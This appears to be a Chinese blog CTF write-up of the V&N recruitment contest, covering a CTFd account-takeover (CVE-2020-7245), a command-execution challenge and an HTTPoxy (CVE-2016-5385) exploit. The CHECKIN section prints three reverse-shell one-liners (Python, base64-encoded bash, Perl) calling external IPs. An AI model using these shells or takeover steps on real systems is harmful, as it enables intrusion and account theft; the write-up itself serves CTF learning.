@@ -1,0 +1,388 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>V&amp;N招新公开赛题解</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <link href="https://fonts.googleapis.com/css?family=Noto+Sans+SC&display=swap" rel="stylesheet">
+    <link href="https://cdn.jsdelivr.net/gh/tonsky/FiraCode@2/distr/fira_code.css" rel="stylesheet">
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/2020/03/20/Ret2Text%E5%8E%9F%E7%90%86%E5%8F%8A%E5%BA%94%E7%94%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/2020/03/20/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-qq " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-weibo " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&text=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=V&amp;N招新公开赛题解&body=Check out this article: http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-HappyCTFd"><span class="toc-number">1.</span> <span class="toc-text">0x 01 HappyCTFd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CHECKIN"><span class="toc-number">2.</span> <span class="toc-text">0x 02 CHECKIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-TimeTravle"><span class="toc-number">3.</span> <span class="toc-text">0x 03 TimeTravle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-EasySpringMVC"><span class="toc-number">4.</span> <span class="toc-text">0x 04 EasySpringMVC</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        V&amp;N招新公开赛题解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">John Doe</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-03-20T05:57:58.000Z" itemprop="datePublished">2020-03-20</time>
+        
+        (Updated: <time datetime="2020-03-20T14:44:45.281Z" itemprop="dateModified">2020-03-20</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/ctfwp/">ctfwp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/BUUOJ/" rel="tag">BUUOJ</a>, <a class="tag-link" href="/tags/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B/" rel="tag">V&N招新公开赛</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="0x-01-HappyCTFd"><a href="#0x-01-HappyCTFd" class="headerlink" title="0x 01 HappyCTFd"></a>0x 01 HappyCTFd</h3><ul>
+<li><p>考点</p>
+<p>CVE-2020-7245</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>原理分析：</li>
+</ol>
+<p>注册用户时判断用户是否存在的时候没有对两端空格进行处理，而插入数据库的时候去除了两端的空格。而后在重置密码时，用的又是这个被处理之后的用户名。</p>
+<ol start="2">
+<li>攻击流程：</li>
+</ol>
+<blockquote>
+<ol>
+<li>利用添加空格绕过限制来注册一个与受害者用户名相同的账号</li>
+<li>生成忘记密码链接发送到自己的邮箱</li>
+<li>将自己的账号的用户名改成与被攻击者不相同的用户名</li>
+<li>用邮箱中收到的链接更改密码即可。</li>
+</ol>
+</blockquote>
+<ol start="3">
+<li>首先注册一个用户名为 “空格+admin” 的账户。</li>
+</ol>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174410739.png" alt></p>
+<p>然后用隐私窗口打开，发送密码重置邮件</p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174705064.png" alt></p>
+<p>之后修改自己的用户名</p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174817943.png" alt></p>
+<p>用邮箱中的链接来重置密码</p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320174915348.png" alt></p>
+<p>在后台隐藏的题目中找到了flag</p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320175042556.png" alt></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a></p>
+</blockquote>
+<h3 id="0x-02-CHECKIN"><a href="#0x-02-CHECKIN" class="headerlink" title="0x 02 CHECKIN"></a>0x 02 CHECKIN</h3><ul>
+<li><p>考点</p>
+<p>Linux 基本知识</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>页面右键打开查看源代码进行审计</li>
+</ol>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320180352562.png" alt></p>
+<p>shell路由通过传入参数可以进行命令执行，在每次执行命令前都会把 flag 文件删除且不带回显结果</p>
+<ol start="2">
+<li>因为是python应用，先反弹一个shell到内网的一个靶机中</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">第一种</span><br><span class="line">python3 -c &#39;import socket,subprocess,os;s&#x3D;socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;174.1.34.205&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br><span class="line"></span><br><span class="line">第二种</span><br><span class="line">echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3NC4wLjIyMi4yMDMvMTIzNCAwPiYxCg&#x3D;&#x3D;|base64 -d|bash</span><br><span class="line"></span><br><span class="line">第三种</span><br><span class="line">perl -MIO -e &#39;$p&#x3D;fork;exit,if($p);$c&#x3D;new IO::Socket::INET(PeerAddr,&quot;174.0.222.203:1234&quot;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320182713990.png" alt></p>
+<p>这里引入文件描述符：</p>
+<p><strong>什么是文件描述符：</strong>内核利用文件描述符来访问文件。文件描述符是非负整数。打开现存文件或新建文件时，内核会返回一个文件描述符。读写文件也需要使用文件描述符来指定待读写的文件。</p>
+<p>例如Python中，当我们open()函数打开一个文件时便创建了一个文件描述符，而后对这个文件描述符使用read()函数便是读取文件描述符中的内容，close()函数用于关闭/销毁这个文件描述符。</p>
+<p><strong>文件描述符储存在什么地方：</strong><code>/proc/&lt;pid&gt;/fd&lt;id&gt;</code></p>
+<p>也就是说，我们可以通过cat进程中的fd来获取到文件描述符。相关知识点在高校运维挑战赛中也考到了。</p>
+<p>利用<code>cat /proc/*/fd/*</code>读取文件缓存找到被移除的flag.txt，得到flag</p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320183213503.png" alt></p>
+<h3 id="0x-03-TimeTravle"><a href="#0x-03-TimeTravle" class="headerlink" title="0x 03 TimeTravle"></a>0x 03 TimeTravle</h3><ul>
+<li><p>考点</p>
+<p>HTTPoxy漏洞（CVE-2016-5385）</p>
+</li>
+<li><p>解题过程</p>
+</li>
+</ul>
+<ol>
+<li>页面打开显示了源代码，进行审计</li>
+</ol>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320195204663.png" alt></p>
+<p>传入参数flag，会请求一个 HTTPAPI 服务，那个服务返回 success 的话就执行程序读 flag。</p>
+<p>传入参数file，就回去读这个文件。</p>
+<p>传入参数phpinfo，就会执行 phpinfo。</p>
+<ol start="2">
+<li>用返回包中可以知道服务器使用的是Nginx + PHP，查看phpinfo服务器是cgi模式，符合<a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a> 所述，我们需要传入一个 Proxy头，使其产生一个 HTTP_PROXY 环境变量，这个环境变量再被程序里的 GuzzleHttp 使用，即可使流量走代理，控制返回的请求。</li>
+<li>尝试进行文件读取<code>/start.sh</code></li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env bash</span><br><span class="line"></span><br><span class="line">chmod +x &#x2F;readflag</span><br><span class="line">chmod +s &#x2F;readflag</span><br><span class="line">echo $FLAG &gt; &#x2F;flag &amp;&amp; export FLAG&#x3D;not_flag &amp;&amp; FLAG&#x3D;not_flag &amp;&amp; cd &#x2F;srv&#x2F;</span><br><span class="line"></span><br><span class="line">chmod 700 &#x2F;flag</span><br><span class="line"></span><br><span class="line">python3 &#x2F;srv&#x2F;app.py &amp;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">php-fpm &amp;</span><br><span class="line"></span><br><span class="line">service nginx start</span><br><span class="line"></span><br><span class="line">tail -F &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>
+
+<p>开启了<code>php-fpm</code>，<code>http://127.0.0.1:5000/api/eligible</code>服务就是这个<code>/srv/app.py</code>提供的,读取<code>/srv/app.py</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">import datetime</span><br><span class="line">import json</span><br><span class="line">app &#x3D; Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&#39;&#x2F;api&#x2F;eligible&#39;)</span><br><span class="line">def source():</span><br><span class="line">    current_year &#x3D; int(datetime.datetime.now().strftime(&quot;%Y&quot;))</span><br><span class="line">    if current_year &lt; 2050:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: False&#125;)</span><br><span class="line">    else:</span><br><span class="line">        return json.dumps(&#123;&quot;success&quot;: True&#125;)</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &quot;__main__&quot;:</span><br><span class="line">    app.run(host&#x3D;&#39;127.0.0.1&#39;)</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>方法一：构造一个response返回就可以了，参考一位师傅的payload：</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: nginx&#x2F;1.14.2</span><br><span class="line">Date: Sat, 29 Feb 2020 05:27:31 GMT</span><br><span class="line">Content-Type: text&#x2F;html; charset&#x3D;UTF-8</span><br><span class="line">Connection: Keep-alive</span><br><span class="line">Content-Length: 16</span><br><span class="line"></span><br><span class="line">&#123;&quot;success&quot;:true&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194617008.png" alt></p>
+<p><img src="/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/image-20200320194548045.png" alt></p>
+<p>方法二：用SimpleHTTPServer模块</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DemoHttpServer</span><span class="params">(BaseHTTPRequestHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.send_response(<span class="number">200</span>, message=<span class="string">'OK'</span>)</span><br><span class="line">        self.send_header(<span class="string">'Content-Type'</span>, <span class="string">'application/json'</span>)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(json.dumps(&#123;<span class="string">"success"</span>: <span class="literal">True</span>&#125;).encode())</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">'0.0.0.0'</span>, <span class="number">1234</span>), DemoHttpServer)</span><br><span class="line">    print(<span class="string">'Server is running, user &lt;Ctrl+C&gt; to srop.'</span>)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>
+
+<p>方法三：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$arr = <span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line">header(<span class="string">"Content-Type:application/json"</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($arr);</span><br></pre></td></tr></table></figure>
+
+<p>当前目录启动<code>php -S 0:2333</code></p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/cgi/httpoxy</a></p>
+</blockquote>
+<h3 id="0x-04-EasySpringMVC"><a href="#0x-04-EasySpringMVC" class="headerlink" title="0x 04 EasySpringMVC"></a>0x 04 EasySpringMVC</h3><p>待补上</p>
+<p>参考资料：</p>
+<blockquote>
+<p><a href="https://blog.csdn.net/Leon_cx/article/details/81517603" target="_blank" rel="noopener">https://blog.csdn.net/Leon_cx/article/details/81517603</a></p>
+<p><a href="https://blog.csdn.net/chasingin/article/details/104593868" target="_blank" rel="noopener">https://blog.csdn.net/chasingin/article/details/104593868</a></p>
+<p><a href="https://www.zhaoj.in/read-6407.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6407.html</a></p>
+</blockquote>
+
+  </div>
+</article>
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-01-HappyCTFd"><span class="toc-number">1.</span> <span class="toc-text">0x 01 HappyCTFd</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-02-CHECKIN"><span class="toc-number">2.</span> <span class="toc-text">0x 02 CHECKIN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-03-TimeTravle"><span class="toc-number">3.</span> <span class="toc-text">0x 03 TimeTravle</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x-04-EasySpringMVC"><span class="toc-number">4.</span> <span class="toc-text">0x 04 EasySpringMVC</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-qq fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://service.weibo.com/share/share.php?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&title=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-weibo fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/&text=V&amp;N招新公开赛题解" target="_blank" rel="noopener"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=V&amp;N招新公开赛题解&body=Check out this article: http://yoursite.com/2020/03/20/V-N%E6%8B%9B%E6%96%B0%E5%85%AC%E5%BC%80%E8%B5%9B%E9%A2%98%E8%A7%A3/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2020 John Doe 
+    <a href="http://www.beian.miit.gov.cn/" target="_blank">湘ICP备17005082号</a>
+    
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/archives/">Articles</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/tags/">Tag</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+  
+  <div class="footer-custom">
+    Framework by <a href="https://hexo.io" target="_blank">Hexo</a> & Theme by <a href="https://github.com/xuthus5/hexo-theme-cactus" target="_blank">Cactus-CN</a> & CDN provided by
+     
+      <a href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral" target="_blank">
+        <img class="img-response" src="/images/upyun.png" alt="cdn image">
+      </a>
+    
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css">
+
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/justifiedGallery/3.7.0/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="https://cdn.staticfile.org/jquery/3.4.1/jquery.min.js"></script>
+
+
+<script src="https://cdn.staticfile.org/justifiedGallery/3.7.0/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="https://cdn.staticfile.org/clipboard.js/2.0.6/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight .code pre").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      target: function(trigger) {
+        return trigger.nextElementSibling;
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+</body>
+</html>
